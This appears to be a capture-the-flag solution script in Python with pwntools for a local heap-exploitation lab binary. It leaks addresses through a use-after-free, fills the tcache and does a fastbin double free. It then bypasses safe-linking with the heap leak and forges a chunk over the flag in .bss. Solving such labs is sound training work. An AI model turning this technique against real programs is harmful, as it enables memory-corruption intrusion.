# idea: fastbin_dup_into_stack, this time cant directly write to .bss before flag, but calloc command writes the size into .bss. Just need to figure out the right combination of #chunk and chunk size

from pwn import *

malloc_size = 0x18

context.arch = 'amd64'

p = process("/challenge/toddlerheap_level7.1")

def flag_loc_leak():
    p.recvuntil(b"Reading the flag into ")
    flag_loc = int(p.recvuntil(b'.')[:-1], 16)
    return flag_loc

def heap_leak():
    p.sendline(f"calloc 17 {malloc_size}")
    p.sendline(f"free 17")
    p.sendline(b"puts 17")
    p.recvuntil(b"Data: ")
    leak = p.recvuntil(b"\n")[:-1]
    leak = unpack(leak, 'all')
    return leak

def fill_tcache():
    for idx in range(7):
        p.sendline(f"calloc {idx} {malloc_size}")
    for idx in range(7):
        p.sendline(f"free {idx}")

def fastbin_dup_into_stack(target:int):
    p.sendline(f"calloc 4 {malloc_size}")
    p.sendline(f"calloc 17 {malloc_size}")
    p.sendline(b"free 4")
    p.sendline(b"free 17")
    p.sendline(b"free 4")
    
    p.sendline(f"calloc 10 {malloc_size}")
    p.sendline(f"calloc 17 {malloc_size}")

    # write 0x20 into the right place by calloc 0x20
    p.sendline(b"calloc 10 32")

    # alloc to global
    p.sendline("safer_read")
    p.sendline(b"4")
    p.sendline(p64(heap_leak ^ target))
    p.sendline(f"calloc 17 {malloc_size}")
    print(f'target = {hex(target)}')
    p.sendline(f"calloc 6 {malloc_size}")

    # fill the calloc'ed chunk with A's and print flag
    p.sendline(b"safer_read 6")
    p.send(b'A'*24)
    p.sendline(b"puts 6")
    

global_to_flag_offset = 0x28

flag_loc = flag_loc_leak()
print(f'flag_loc = {hex(flag_loc)}')
heap_leak = heap_leak()
print(f'heap_leak = {hex(heap_leak)}')
fill_tcache()
fastbin_dup_into_stack(flag_loc - global_to_flag_offset)

p.interactive()
